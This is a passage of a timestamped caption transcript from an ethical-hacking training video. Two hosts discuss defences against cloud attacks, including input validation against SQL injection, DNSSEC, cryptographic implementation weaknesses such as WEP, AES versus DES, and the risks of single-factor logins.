00:26:28.003\nSo for instance, can we just randomly go,\nkeep this handy.\n\n568\n00:26:28.003 --> 00:26:32.353\nCan we just go, go to Gmail.\n\n569\n00:26:32.353 --> 00:26:35.835\nJust go to the Gmail landing page\nright there, just off the link there.\n\n570\n00:26:35.835 --> 00:26:37.259\nYeah, just, yeah,\nyou were like, right there.\n\n571\n00:26:37.259 --> 00:26:38.434\nPerfect, okay.\n>> [LAUGH]\n\n572\n00:26:38.434 --> 00:26:39.757\n>> I was like, it's right there.\n\n573\n00:26:39.757 --> 00:26:40.337\nAll you have to do is click on Gmail.\n\n574\n00:26:40.337 --> 00:26:41.141\n>> You see how often I use Gmail.\n\n575\n00:26:41.141 --> 00:26:42.894\n[LAUGH]\n>> We're taking a roundabout trip here.\n\n576\n00:26:42.894 --> 00:26:45.520\n>> [LAUGH]\n>> So just big disclaimer here.\n\n577\n00:26:45.520 --> 00:26:47.200\nGoogle is not susceptible to this.\n\n578\n00:26:47.200 --> 00:26:47.850\nI wanna be clear.\n\n579\n00:26:47.850 --> 00:26:51.935\nI'm just pointing out as an example\nwhat could happen, right?\n\n580\n00:26:51.935 --> 00:26:52.540\n>> Mm-hm.\n>> Now, of course,\n\n581\n00:26:52.540 --> 00:26:54.212\nwhat will happen is Google\nis gonna go screw this up.\n\n582\n00:26:54.212 --> 00:26:54.725\n>> Yeah.\n>> [LAUGH]\n\n583\n00:26:54.725 --> 00:26:55.875\n>> Change their security and\n\n584\n00:26:55.875 --> 00:26:58.675\nthen they're gonna fall prey to this and\nI just made a big disclaimer and\n\n585\n00:26:58.675 --> 00:27:01.150\nI look like, well,\nyou know what I look like, anyway.\n\n586\n00:27:01.150 --> 00:27:04.040\nBut not suggesting for a minute,\nall kidding aside, that Google would be\n\n587\n00:27:04.040 --> 00:27:07.590\ncompromised by this, just wanna use\nthis as a show and tell example.\n\n588\n00:27:07.590 --> 00:27:11.299\nSo if we go and we have Mike,\nand you're already there, right?\n\n589\n00:27:11.299 --> 00:27:11.934\nSo, I mean, that's fine.\n\n590\n00:27:11.934 --> 00:27:14.390\nNo need, it's gonna work for\nwhat I want to do, right?\n\n591\n00:27:14.390 --> 00:27:17.329\nSo, what we would do here is\nthat Mike will be prompted,\n\n592\n00:27:17.329 --> 00:27:20.960\nsince he already has an account,\nto be able to a put in the password.\n\n593\n00:27:20.960 --> 00:27:23.961\nNow, in the password field normally,\nwhen you type in passwords.\n\n594\n00:27:23.961 --> 00:27:27.021\nPasswords have to be,\nwe have to allow in other words, for\n\n595\n00:27:27.021 --> 00:27:28.965\ninput using alpha-numeric input.\n\n596\n00:27:28.965 --> 00:27:31.167\nBecause we often use letters and\nnumbers and\n\n597\n00:27:31.167 --> 00:27:34.213\nspecial characters more often\nthan not to be able to do this.\n\n598\n00:27:34.213 --> 00:27:39.147\nSo the password field should be validated\nfor those kinds of inputs, right?\n\n599\n00:27:39.147 --> 00:27:41.519\nWe're gonna have to broadly and\nwidely allow them.\n\n600\n00:27:41.519 --> 00:27:45.362\nHowever, there may be certain special\ncharacters that we don't allow.\n\n601\n00:27:45.362 --> 00:27:48.042\nSo we may not map non-ASCII\ncharacter sets here.\n\n602\n00:27:48.042 --> 00:27:52.282\nWe may not allow special code like\nUnicode characters or ASCII characters or\n\n603\n00:27:52.282 --> 00:27:53.560\nother character types.\n\n604\n00:27:53.560 --> 00:27:56.510\nTo be able to be used because\nwe don't want, for instance,\n\n605\n00:27:56.510 --> 00:27:59.115\nwe don't want emoticons being put in here,\nright?\n\n606\n00:27:59.115 --> 00:28:00.447\n>> Right.\n>> Because that could cause a problem.\n\n607\n00:28:00.447 --> 00:28:07.520\nWe don't want non special characters\nthat are not mapped to the normal set.\n\n608\n00:28:07.520 --> 00:28:11.430\nSo for instance, we may not want\nscientific notation characters here.\n\n609\n00:28:11.430 --> 00:28:15.310\nSo, there's a lot of offset, off character\nsets we could theoretically use or\n\n610\n00:28:15.310 --> 00:28:17.780\nthink about it as hackers,\nwe would try to probe with.\n\n611\n00:28:17.780 --> 00:28:21.870\nIf Google or any vendor is smart, what\nthey've done as input validation on this\n\n612\n00:28:21.870 --> 00:28:25.310\nfield is they've said, hey, A through Z or\n\n613\n00:28:25.310 --> 00:28:28.410\nthe equivalent to whatever language you're\ngonna look whilst in to fewer alphabet.\n\n614\n00:28:29.500 --> 00:28:31.222\nIn Cyrillic, in Farsi and\n\n615\n00:28:31.222 --> 00:28:36.190\nwhatever it may be the equivalent\nlocalized set of characters.\n\n616\n00:28:36.190 --> 00:28:39.450\nZero through nine, so\nagain a numerical equivalent, and\n\n617\n00:28:39.450 --> 00:28:41.400\nthen a mapped set of special characters.\n\n618\n00:28:41.400 --> 00:28:45.540\nExclamation points and\nquestion marks, and things like that.\n\n619\n00:28:45.540 --> 00:28:46.390\nThey're gonna allow that.\n\n620\n00:28:46.390 --> 00:28:49.450\nThey're gonna then have a rule\nthat says no other input allowed.\n\n621\n00:28:49.450 --> 00:28:54.090\nAnd if you do use that input, we should\nspit back a little, nice, polite message\n\n622\n00:28:54.090 --> 00:28:57.850\nthat says sorry, input not understood,\nor password not valid, or whatever.\n\n623\n00:28:57.850 --> 00:29:00.950\nWe shouldn't accept that input,\nparse it and\n\n624\n00:29:00.950 --> 00:29:04.100\nthrow it back against the database, and\nthen have the database figure it out.\n\n625\n00:29:04.100 --> 00:29:07.020\nBecause the problem becomes at that point,\nwe then may actually be running\n\n626\n00:29:07.020 --> 00:29:10.050\nattack code that the database\nmay be compromised with.\n\n627\n00:29:10.050 --> 00:29:11.920\nSo, try to put in something here.\n\n628\n00:29:11.920 --> 00:29:15.760\nTry to go ahead and put in a bunch of,\nobviously clearly not your password\n\n629\n00:29:15.760 --> 00:29:19.770\nfirst of all, but a bunch of random\ncharacters and just garbage, right?\n\n630\n00:29:19.770 --> 00:29:20.910\nWe want to just generate an error.\n\n631\n00:29:20.910 --> 00:29:22.710\nWe don't really care what it is, right?\n\n632\n00:29:22.710 --> 00:29:25.740\nNow the other thing we want to do while\nMike is typing is also understand\n\n633\n00:29:25.740 --> 00:29:29.870\nthe part of input validation is not just\nthe character set, but the amount of data.\n\n634\n00:29:29.870 --> 00:29:32.560\nWe often want to limit\nthe amount of data in a field\n\n635\n00:29:32.560 --> 00:29:37.320\nto prevent buffer overflows from occurring\nget another outcome of injection attacks.\n\n636\n00:29:37.320 --> 00:29:42.190\nAnd so we want to limit it to maybe\n255 characters or something like that.\n\n637\n00:29:42.190 --> 00:29:46.280\nPasswords have to be long to be complex,\nbut they're not normally that long.\n\n638\n00:29:46.280 --> 00:29:50.970\nWhat we want to not do is have\nan unstructured unlimited amount of text\n\n639\n00:29:50.970 --> 00:29:52.030\ninput on a field.\n\n640\n00:29:52.030 --> 00:29:55.540\nBecause then I could literally dump\nan entire attack script, that's, you know?\n\n641\n00:29:55.540 --> 00:29:57.320\n>> Yeah.\n>> A thousand lines long\n\n642\n00:29:57.320 --> 00:29:58.980\ninto the field and execute it.\n\n643\n00:29:58.980 --> 00:30:01.890\nAnd if I'm not watching for that,\nI'm gonna allow that to run against\n\n644\n00:30:01.890 --> 00:30:04.980\nthe backend and I've just basically\nowned the database, right?\n\n645\n00:30:04.980 --> 00:30:05.970\nThat could be a bad outcome.\n\n646\n00:30:05.970 --> 00:30:07.300\nSo what happened when\nyou put that in there?\n\n647\n00:30:07.300 --> 00:30:08.400\nI see we got some red on the screen.\n\n648\n00:30:08.400 --> 00:30:10.190\n>> Email or\npassword you entered doesn't match.\n\n649\n00:30:10.190 --> 00:30:12.745\n>> All right, so in other words,\nthere’s no match there.\n\n650\n00:30:12.745 --> 00:30:16.385\nThere’s bad input but we don’t see\nan error, we do see an error but\n\n651\n00:30:16.385 --> 00:30:18.395\nwhat I mean is,\nwe don’t see an error that’s catastrophic.\n\n652\n00:30:18.395 --> 00:30:21.445\nWe don’t get an unrecognized error screen.\n\n653\n00:30:21.445 --> 00:30:23.720\nYou know the kind that we get\nfrom databases traditionally.\n\n654\n00:30:23.720 --> 00:30:25.540\nWe're not exploiting a weakness.\n\n655\n00:30:25.540 --> 00:30:28.080\nWe're simply being asked to\nre-input our data, right?\n\n656\n00:30:28.080 --> 00:30:32.030\nSo this is how we would prevent injection\nattacks from occurring, would be to have\n\n657\n00:30:32.030 --> 00:30:35.300\ninput validation and making sure that\nwe're doing these kind of things.\n\n658\n00:30:35.300 --> 00:30:37.500\n>> Yeah, and it's probably good\nto point out at this point,\n\n659\n00:30:37.500 --> 00:30:41.862\nwhen we talk about SQL injection, it's not\na vulnerability on the database itself.\n\n660\n00:30:41.862 --> 00:30:44.382\nThe database is doing what\nit is supposed to do.\n\n661\n00:30:44.382 --> 00:30:46.886\nIt's processing this\ndata that is received.\n\n662\n00:30:46.886 --> 00:30:49.949\nIt's the people that are using\nthis on the front end.\n\n663\n00:30:49.949 --> 00:30:52.420\nThe developers that's\nnot checking the data.\n\n664\n00:30:52.420 --> 00:30:53.101\n>> It is always the developers.\n\n665\n00:30:53.101 --> 00:30:54.061\n>> I know.\n\n666\n00:30:54.061 --> 00:30:57.585\nIf we just got rid of them\neverything else would work out fine.\n\n667\n00:30:57.585 --> 00:30:59.440\n>> [LAUGH]\n>> It would be a much better world.\n\n668\n00:30:59.440 --> 00:31:01.334\nWe'd have a lot less functionality,\nbut you know on the bright side?\n\n669\n00:31:01.334 --> 00:31:03.717\nMy stove and my refrigerator would\nnot be talking to each other anymore.\n\n670\n00:31:03.717 --> 00:31:05.615\n>> That's right.\n>> I wouldn't have to pay for counseling,\n\n671\n00:31:05.615 --> 00:31:07.453\nrelationship counseling,\nto keep them together.\n\n672\n00:31:07.453 --> 00:31:08.094\n>> Because they wouldn't even know.\n\n673\n00:31:08.094 --> 00:31:09.418\n>> Cuz they wouldn't know each other.\n\n674\n00:31:09.418 --> 00:31:14.288\nIn a perfect world, there would be\nno inter appliance relationships.\n\n675\n00:31:14.288 --> 00:31:15.986\nThat would not be an issue.\n\n676\n00:31:15.986 --> 00:31:16.916\nYou see?\n\n677\n00:31:16.916 --> 00:31:19.785\nJust no developers,\nI'm starting a campaign.\n\n678\n00:31:19.785 --> 00:31:20.367\nNo developers.\n\n679\n00:31:20.367 --> 00:31:21.236\n>> Yeah, I think we should.\n\n680\n00:31:21.236 --> 00:31:22.609\n>> We like developers.\n\n681\n00:31:22.609 --> 00:31:25.505\nIf it wasn't for developers, right?\n\n682\n00:31:25.505 --> 00:31:28.436\nMy refrigerator wouldn't be able to\nsend information to me in the cloud and\n\n683\n00:31:28.436 --> 00:31:29.606\nshow me that I'm out of eggs.\n\n684\n00:31:29.606 --> 00:31:30.370\n>> That's right.\n\n685\n00:31:30.370 --> 00:31:31.518\n>> Good job.\n\n686\n00:31:31.518 --> 00:31:33.705\n>> [LAUGH]\n>> All right, but all kidding aside.\n\n687\n00:31:33.705 --> 00:31:35.632\nIt's not all the developers\nfault by any means.\n\n688\n00:31:35.632 --> 00:31:38.490\nBut having said that,\nthey do bear some responsibility.\n\n689\n00:31:38.490 --> 00:31:39.910\nWe do wanna be clear about this.\n\n690\n00:31:39.910 --> 00:31:43.540\nLack of attention to detail with\nregards to secure coding practices\n\n691\n00:31:43.540 --> 00:31:46.170\nis the primary reason why\ninjection attacks and\n\n692\n00:31:46.170 --> 00:31:48.940\nall the other vulnerabilities\nthat we've talked about do occur.\n\n693\n00:31:48.940 --> 00:31:51.875\nAnd the majority of developers\ndo an awesome and great job,\n\n694\n00:31:51.875 --> 00:31:55.707\nwrite secure code and are the reason we\ncan do all the great things we do today.\n\n695\n00:31:55.707 --> 00:32:00.665\nBut people that are not trained properly,\ndevelopers that don't know how to\n\n696\n00:32:00.665 --> 00:32:04.336\nwrite code securely,\nthat don't follow a secure SDLC.\n\n697\n00:32:04.336 --> 00:32:08.782\nIn the application deployment and the\napplication development life cycles that\n\n698\n00:32:08.782 --> 00:32:13.230\nthey have to engage in are, unfortunately,\npropagating these weaknesses.\n\n699\n00:32:13.230 --> 00:32:15.180\nAnd there is a subset of people out there,\n\n700\n00:32:15.180 --> 00:32:18.100\nlike there is at every organization,\nthat do the right thing.\n\n701\n00:32:18.100 --> 00:32:20.180\nAnd then there are just some that\nunfortunately are not trained,\n\n702\n00:32:20.180 --> 00:32:23.300\nand therefore don't know, perhaps,\nthat they're doing the wrong thing.\n\n703\n00:32:23.300 --> 00:32:25.115\nAnd I'm sure if they knew, they would not.\n\n704\n00:32:25.115 --> 00:32:28.280\nBut we can certainly\nunderstand why this happens.\n\n705\n00:32:28.280 --> 00:32:31.880\nWe just have to figure out how to defend\nagainst it, so it doesn't happen to us.\n\n706\n00:32:31.880 --> 00:32:34.840\nThat's the job, or one of the jobs anyway,\nof the ethical hacker.\n\n707\n00:32:34.840 --> 00:32:38.560\nSo we have an attack propagation\nconcern with injection attacks,\n\n708\n00:32:38.560 --> 00:32:39.420\none way to think about this.\n\n709\n00:32:39.420 --> 00:32:41.140\nWhat about DNS, right?\n\n710\n00:32:41.140 --> 00:32:43.830\nAll sorts of stuff with name resolution.\n\n711\n00:32:43.830 --> 00:32:47.610\nWhat would be the primary way\nwe can sustain a use of DNS, but\n\n712\n00:32:47.610 --> 00:32:48.530\nto do so securely?\n\n713\n00:32:48.530 --> 00:32:51.540\nWhat would be the number one thing you'd\nthink of, other than not going out and\n\n714\n00:32:51.540 --> 00:32:52.800\nshopping the web in the first place?\n\n715\n00:32:52.800 --> 00:32:54.070\n>> Okay.\n>> Yeah, if we're gonna use DNS,\n\n716\n00:32:54.070 --> 00:32:54.620\nwhat else would we do?\n\n717\n00:32:54.620 --> 00:32:56.200\n>> I would say DNSsec,\n\n718\n00:32:56.200 --> 00:33:00.160\na way to make sure that the responses\nthat we're getting from that DNS server\n\n719\n00:33:00.160 --> 00:33:03.240\nare from the actual DNS server we're\nexpecting to get those responses from.\n\n720\n00:33:03.240 --> 00:33:05.970\n>> So we're gonna essentially\nuse digital signatures and\n\n721\n00:33:05.970 --> 00:33:10.000\nvalidate through the use of that to make\nsure that those registration records and\n\n722\n00:33:10.000 --> 00:33:12.420\nthat information is legitimate,\ncoming from trusted sources.\n\n723\n00:33:12.420 --> 00:33:15.140\nGreat way to think about that, absolutely.\n\n724\n00:33:15.140 --> 00:33:19.830\nAnd what about, let's say, ooh, what's\nanother good one we should think about?\n\n725\n00:33:19.830 --> 00:33:21.239\nTalked about SQL injection,\n\n726\n00:33:21.239 --> 00:33:24.800\ndenial of services, denial of services,\nkinda hit on those.\n\n727\n00:33:24.800 --> 00:33:26.540\nWhat about crypto-analytic attacks?\n\n728\n00:33:26.540 --> 00:33:29.820\nWhat about hacking\nthe underlying architecture\n\n729\n00:33:29.820 --> 00:33:33.850\nof the cryptographic system and\nthe implementation of that system?\n\n730\n00:33:33.850 --> 00:33:35.700\n>> Was gonna say, we've talked about-\n>> [CROSSTALK] In wireless for instance,\n\n731\n00:33:35.700 --> 00:33:36.788\nwe talk about the weaknesses in WEP.\n\n732\n00:33:36.788 --> 00:33:37.485\n>> Yeah.\n\n733\n00:33:37.485 --> 00:33:38.550\n>> That whole thing.\n\n734\n00:33:38.550 --> 00:33:40.891\nSo how will we defend\nagainst some of that?\n\n735\n00:33:40.891 --> 00:33:41.666\nWhat do you think we would do there?\n\n736\n00:33:41.666 --> 00:33:45.566\n>> Well, maybe making sure that if we\ndon't know what we're doing, we're not\n\n737\n00:33:45.566 --> 00:33:49.070\nthe ones choosing and implementing\nthe cryptography or the system.\n\n738\n00:33:49.070 --> 00:33:53.380\n>> So right, so don't let the people that\naren't trained, right, run the system,\n\n739\n00:33:53.380 --> 00:33:55.980\nthat would probably be a good\nplace to start, absolutely, right?\n\n740\n00:33:55.980 --> 00:33:59.365\nSo Johnny,\nhere's this million-dollar algorithm.\n\n741\n00:33:59.365 --> 00:34:01.010\n>> Mm-hm.\n>> We want you to go implement it.\n\n742\n00:34:01.010 --> 00:34:01.640\nOkay.\n\n743\n00:34:01.640 --> 00:34:03.071\nRight.\nAnd Johnny has no clue what we're\n\n744\n00:34:03.071 --> 00:34:03.675\ntalking about.\n\n745\n00:34:03.675 --> 00:34:05.030\n>> [LAUGH]\n>> So definitely don't want that\n\n746\n00:34:05.030 --> 00:34:05.850\nto happen.\n\n747\n00:34:05.850 --> 00:34:08.440\nAnd studies show, not just studies,\nhistory shows, I mean,\n\n748\n00:34:08.440 --> 00:34:11.070\nlook at what happened with\nthe early days of wireless and\n\n749\n00:34:11.070 --> 00:34:15.580\nthe whole issue around WEP, and why WEP so\nearly on, was found to be problematic.\n\n750\n00:34:15.580 --> 00:34:17.100\nPeople misunderstand this.\n\n751\n00:34:17.100 --> 00:34:18.480\nI talk about this every time.\n\n752\n00:34:18.480 --> 00:34:20.810\nNot when you and I get together\nwhen we talk about security, but\n\n753\n00:34:20.810 --> 00:34:25.570\nin all the conversations I have across all\nthe episodes we've done here at IT Pro TV,\n\n754\n00:34:25.570 --> 00:34:28.360\nin all the different areas we do, and\nI talk about this with customers and\n\n755\n00:34:28.360 --> 00:34:29.730\nstudents all the time.\n\n756\n00:34:29.730 --> 00:34:32.070\nA lot of people think,\nyeah, WEP was garbage.\n\n757\n00:34:32.070 --> 00:34:32.910\nIt was, right.\n\n758\n00:34:32.910 --> 00:34:34.350\nAnd there were problems with it but\n\n759\n00:34:34.350 --> 00:34:39.450\nmost people don't realize it wasn't\nWEP itself that was the problem.\n\n760\n00:34:39.450 --> 00:34:43.450\nIt was the implementation of the way\nthat the application protection,\n\n761\n00:34:43.450 --> 00:34:47.660\nthe cryptographic solution that\nwas build into WEP was designed.\n\n762\n00:34:47.660 --> 00:34:51.640\nThe algorithm used, RC4, the drive WEP,\nwas a good algorithm, and\n\n763\n00:34:51.640 --> 00:34:53.370\nto this day is a good algorithm.\n\n764\n00:34:53.370 --> 00:34:56.020\nAnd it is strong and\nit is secure when implemented properly.\n\n765\n00:34:56.020 --> 00:34:59.650\nPeople blame WEP, and\nthe failure of WEP, on RC4.\n\n766\n00:34:59.650 --> 00:35:02.070\nIt's not RC4, it's the implementation,\n\n767\n00:35:02.070 --> 00:35:05.800\nwith the small key space that allowed\nthe keys to be found and compromised.\n\n768\n00:35:05.800 --> 00:35:08.410\nBecause people made bad choices\nabout how to implement,\n\n769\n00:35:08.410 --> 00:35:09.910\nthat was the problem with WEP.\n\n770\n00:35:09.910 --> 00:35:13.440\nAnd so it's as much about the design\nas it is about understanding how to\n\n771\n00:35:13.440 --> 00:35:15.500\nimplement that design correctly.\n\n772\n00:35:15.500 --> 00:35:18.100\nWe talked about this in some of\nthe earlier episodes with regards to\n\n773\n00:35:18.100 --> 00:35:18.700\ncar hackers.\n\n774\n00:35:18.700 --> 00:35:19.252\n>> Yes.\n>> And\n\n775\n00:35:19.252 --> 00:35:22.896\ndecisions that people make to be\nable to do things a certain way.\n\n776\n00:35:22.896 --> 00:35:26.637\nSo, when you think about this,\ncrypto-analytic attacks are really gonna\n\n777\n00:35:26.637 --> 00:35:30.450\nbe successful if we allow weaknesses\nto be propagated through these system.\n\n778\n00:35:30.450 --> 00:35:34.958\nThe fact that we can discern patterns,\nany kind of match, any kind of pattern,\n\n779\n00:35:34.958 --> 00:35:38.685\nany kind of sameness when it\ncomes to cryptography is deadly.\n\n780\n00:35:38.685 --> 00:35:40.090\nThere's just no other way to put it.\n\n781\n00:35:40.090 --> 00:35:44.480\nYou don't want your system to be broken,\nyou make sure that there is no way for\n\n782\n00:35:44.480 --> 00:35:46.590\nthat key to repeat during normal use.\n\n783\n00:35:46.590 --> 00:35:50.040\nYou don't want your system to be\ncompromised, you don't re-use anything in\n\n784\n00:35:50.040 --> 00:35:52.980\nthat system because everything has to\nbe unique every time you go in there,\n\n785\n00:35:52.980 --> 00:35:54.140\nevery time you do something.\n\n786\n00:35:54.140 --> 00:35:56.160\nThat key space has to be massive.\n\n787\n00:35:56.160 --> 00:35:58.210\nThat work factor, huge.\n\n788\n00:35:58.210 --> 00:36:01.390\nWork factor, measure of time\nit takes to break the system.\n\n789\n00:36:01.390 --> 00:36:06.046\nKey space, number of total possible\ncombinations of keys available for use.\n\n790\n00:36:06.046 --> 00:36:08.901\nThe higher those numbers are,\nthe safer and more secure that system is.\n\n791\n00:36:08.901 --> 00:36:12.405\nThe lower those numbers are, the more\nlikely that somebody's gonna tell you what\n\n792\n00:36:12.405 --> 00:36:15.410\nyou just sent secretly,\nthat they were not supposed to see.\n\n793\n00:36:15.410 --> 00:36:19.520\nSo you've got to understand as an ethical\nhacker how to defend against this kind\n\n794\n00:36:19.520 --> 00:36:22.960\nof stuff by forcing, and\nI mean this when I say this,\n\n795\n00:36:22.960 --> 00:36:28.530\nforcing the conversation in the enterprise\nwith regards to secure implementation and\n\n796\n00:36:28.530 --> 00:36:30.960\nsecure use of these kind of systems.\n\n797\n00:36:30.960 --> 00:36:34.640\nMaking bad choices is not an excuse for\nbad outcomes.\n\n798\n00:36:34.640 --> 00:36:36.825\nIt's the reason, it's not an excuse.\n\n799\n00:36:36.825 --> 00:36:38.390\nYou've gotta plan to be successful.\n\n800\n00:36:38.390 --> 00:36:41.440\nIf you have a choice between using DES,\nTriple DES, and\n\n801\n00:36:41.440 --> 00:36:43.450\nAES, which one are you gonna choose?\n\n802\n00:36:43.450 --> 00:36:44.440\n>> I'm going with AES.\n\n803\n00:36:45.520 --> 00:36:47.470\n>> That's why I love this man.\n\n804\n00:36:47.470 --> 00:36:48.330\nHe knows.\n\n805\n00:36:48.330 --> 00:36:49.390\nAES.\n\n806\n00:36:49.390 --> 00:36:54.100\nYou're gonna go with AES because AES is\nnot, most likely under normal conditions\n\n807\n00:36:54.100 --> 00:36:58.760\nassuming it's implemented correctly,\ngoing to be susceptible to being found and\n\n808\n00:36:58.760 --> 00:37:03.060\ncracked the way that DES certainly,\nno doubt about it these days, and\n\n809\n00:37:03.060 --> 00:37:06.460\nTriple DES has been proven to be because\nof the amount of computing power\n\n810\n00:37:06.460 --> 00:37:09.770\nwe can throw against them and the fact\nthat they're just not as strong anymore\n\n811\n00:37:09.770 --> 00:37:12.520\nas they were 30 some odd years ago\nwhen they were first implemented.\n\n812\n00:37:12.520 --> 00:37:15.130\nAnd they were considered to be\ntop of the line at that point.\n\n813\n00:37:15.130 --> 00:37:17.436\nUsed by the government and\nthe military for years.\n\n814\n00:37:17.436 --> 00:37:21.546\nNo higher accolades, right, when you're\nkeeping top secret sensitive information\n\n815\n00:37:21.546 --> 00:37:23.754\nsecure for a government or\na military entity.\n\n816\n00:37:23.754 --> 00:37:26.795\nBut we've also been told we\ncan't do that anymore and\n\n817\n00:37:26.795 --> 00:37:31.121\nAES should be used as a substitute\nbecause it's stronger, variable size,\n\n818\n00:37:31.121 --> 00:37:35.806\nimplemented through 128 to 256 bits and\nas a result all the way up to 192.\n\n819\n00:37:35.806 --> 00:37:40.948\nI'm sorry 128,192, and 256 cuz in\nmy world 192 does come before 256.\n\n820\n00:37:40.948 --> 00:37:41.640\n>> Most of the time.\n\n821\n00:37:41.640 --> 00:37:43.014\n>> And most of the time anyway.\n\n822\n00:37:43.014 --> 00:37:47.285\nBut today's Friday, so you never know,\nmaybe not, but the reality is because it's\n\n823\n00:37:47.285 --> 00:37:51.692\ngot a variable implementation size, we can\ncreate some very strong implementations.\n\n824\n00:37:51.692 --> 00:37:54.613\nThis is the kind of thing we gotta\nthink about with regards to cloud\n\n825\n00:37:54.613 --> 00:37:55.950\ncomputing attacks.\n\n826\n00:37:55.950 --> 00:37:59.200\nThis the kind of thing we gotta think\nabout with regards to how we defend\n\n827\n00:37:59.200 --> 00:38:01.300\nagainst them and\nall the things associated.\n\n828\n00:38:01.300 --> 00:38:02.890\nWhat about social engineering?\n\n829\n00:38:02.890 --> 00:38:05.330\nRight, what about tricking\npeople into giving stuff up?\n\n830\n00:38:05.330 --> 00:38:06.600\nYou're using the cloud service,\n\n831\n00:38:06.600 --> 00:38:11.300\nright, you're sitting there and what's\nbetween you and the bad actor getting in?\n\n832\n00:38:11.300 --> 00:38:14.530\nA single factor authentication system\ntraditionally, username and password.\n\n833\n00:38:14.530 --> 00:38:17.754\nI mean, do me a favor, pull up the logon\nand when you're ready just let me know.\n\n834\n00:38:17.754 --> 00:38:19.920\nPull up the logon for Office 365.\n\n835\n00:38:19.920 --> 00:38:23.680\nSo as soon as Mike's got that\nup we'll take a look, right?\n\n836\n00:38:23.680 --> 00:38:26.840\nSo when we talk about getting\ninto a could service, right,\n\n837\n00:38:26.840 --> 00:38:31.480\nall that stands between you traditionally\nis the user and the cloud customer and\n\n838\n00:38:31.480 --> 00:38:35.820\nthe cloud provider communicating is a web\npage with an authentication form on it.\n\n839\n00:38:35.820 --> 00:38:38.120\nIt's usually gonna be\na single factor form.\n\n840\n00:38:38.120 --> 00:38:40.850\nWhich means that if\nthe user has compromised or\n\n841\n00:38:40.850 --> 00:38:44.780\nhas been compromised through the guessing\nend or acquisition of their username and\n\n842\n00:38:44.780 --> 00:38:47.830\npassword, that's all that's\nessentially gonna be the case, right.\n\n843\n00:38:47.830 --> 00:38:51.500\nSo when you go here, all you need\nto do is provide a username and\n\n844\n00:38:51.500 --> 00:38:53.615\na password and you will get in.\n\n845\n00:38:53.615 --> 00:38:56.300\nAnd I'm not saying it's not secure,\n\n846\n00:38:56.300 --> 00:39:01.570\nI'm just pointing out that, how hard\nis it to get a username and a password?\n\n847\n00:39:01.570 --> 00:39:03.910\nBy the way, you've got the format for\n\n848\n00:39:03.910 --> 00:39:07.340\nthe username already because if somebody\ngets an email from anybody in the domain,\n\n849\n00:39:07.340 --> 00:39:10.900\nright, in this tenant,\nthey've essentially got the format for\n\n850\n00:39:10.900 --> 00:39:14.690\nthe username because you're logging\non with that email as your username.\n\n851\n00:39:14.690 --> 00:39:17.267\nSo you've already got half\nthe equation publicly available.\n\n852\n00:39:17.267 --> 00:39:20.769\nAll we really are standing on\nis the strength of the password.\n\n853\n00:39:20.769 --> 00:39:21.318\n>> Right.\n\n854\n00:39:21.318 --> 00:39:22.446\n>> So think about that, right?\n\n855\n00:39:22.446 --> 00:39:24.250\nI mean maybe not so secure.\n\n856\n00:39:24.250 --> 00:39:27.290\nRight now we're sniffing,\nwe've shown you ample examples of running\n\n857\n00:39:27.290 --> 00:39:29.670\nsniffing programs to be\nable to find traffic.\n\n858\n00:39:29.670 --> 00:39:31.480\nSo think about that, right?\n\n859\n00:39:31.480 --> 00:39:36.885\nThink about the fact that there may be\nsession hijacking taking place because\n\n860\n00:39:36.885 --> 00:39:39.075\ninformation is flowing in the clear.\n\n861\n00:39:39.075 --> 00:39:42.235\nWe can find usernames and\npasswords, we've talked about that.\n\n862\n00:39:42.235 --> 00:39:44.924\nWe may not be taking care and\nfocusing on and\n\n863\n00:39:44.924 --> 00:39:48.074\nreally thinking about\nwhere that data's going.\n\n864\n00:39:48.074 --> 00:39:50.846\nThere may be redirect attacks and\nspoofing and masquerading,\n\n865\n00:39:50.846 --> 00:39:52.946\nand man in the middle\nattacks that are going on.\n\n866\n00:39:52.946 --> 00:39:56.920\nWe may not, excuse me, be taking\nenough time to be able to understand,\n\n867\n00:39:56.920 --> 00:40:01.761\nin other words, the entire transit path of\nthe data,and protecting it at all places,\n\n868\n00:40:01.761 --> 00:40:04.179\nall phases, all stages of the life cycle.\n\n869\n00:40:04.179 --> 00:40:08.162\nWe were talking earlier about developers,\nand joked around a little bit about\n\n870\n00:40:08.162 --> 00:40:11.963\nthe fact that, clearly, there could\nbe some concern there because not all\n\n871\n00:40:11.963 --> 00:40:15.840\ndevelopers may actually be educated\non how to write code securely.\n\n872\n00:40:15.840 --> 00:40:17.550\nAll the developers that I've ever me or\nworked with, and\n\n873\n00:40:17.550 --> 00:40:21.470\nI did actually do development early on in\nmy career, years and years and years ago.\n\n874\n00:40:21.470 --> 00:40:24.680\nI don't do it anymore because I know that\nI'm not doing it often enough to stay\n\n875\n00:40:24.680 --> 00:40:28.230\nrelevant to be good enough and\nkeep up with what's going on today.\n\n876\n00:40:28.230 --> 00:40:30.300\nBut I certainly can read code,\nI understand it,\n\n877\n00:40:30.300 --> 00:40:32.320\nI know how to write it,\nI have that background.\n\n878\n00:40:32.320 --> 00:40:33.010\nIt's very important for\n\n879\n00:40:33.010 --> 00:40:36.005\nme as a security professional\nto have knowledge in that area.\n\n880\n00:40:36.005 --> 00:40:38.015\nThere's a suspicious hand\nfloating on my screen,\n\n881\n00:40:38.015 --> 00:40:40.390\nit keeps coming in like right about here.\n\n882\n00:40:40.390 --> 00:40:41.095\n>> [LAUGH]\n>> And\n\n883\n00:40:41.095 --> 00:40:44.635\nkinda rubbing something over here on\nthe screen and then it goes away.\n\n884\n00:40:44.635 --> 00:40:47.990\nIt would be really cool if you did\nthat and grab the logo, right here,\n\n885\n00:40:47.990 --> 00:40:49.110\nwhere are you?\n\n886\n00:40:49.110 --> 00:40:51.470\nI always struggle with this,\nmy depth perception is horrible.\n\n887\n00:40:51.470 --> 00:40:52.181\nRight there, yeah.\n\n888\n00:40:52.181 --> 00:40:52.982\n>> [LAUGH]\n>> We got it,\n\n889\n00:40:52.982 --> 00:40:54.595\nit was like shadow puppet theater, right?\n\n890\n00:40:54.595 --> 00:40:57.347\nWe got the little Pac-Man coming\nacross and eating yeah, like that-\n\n891\n00:40:57.347 --> 00:40:58.260\n>> Is it on my finger?\n\n892\n00:40:58.260 --> 00:40:59.545\n>> There you go, like that, exactly.\n\n893\n00:40:59.545 --> 00:41:00.950\n>> [LAUGH]\n>> All right, cuz I always get yelled at.\n\n894\n00:41:00.950 --> 00:41:03.570\nWhen I used to do that in other episodes,\nwhen I first started doing work for\n\n895\n00:41:03.570 --> 00:41:06.590\nITProTV, they cussed at me,\nAdam you put your hand out, and\n\n896\n00:41:06.590 --> 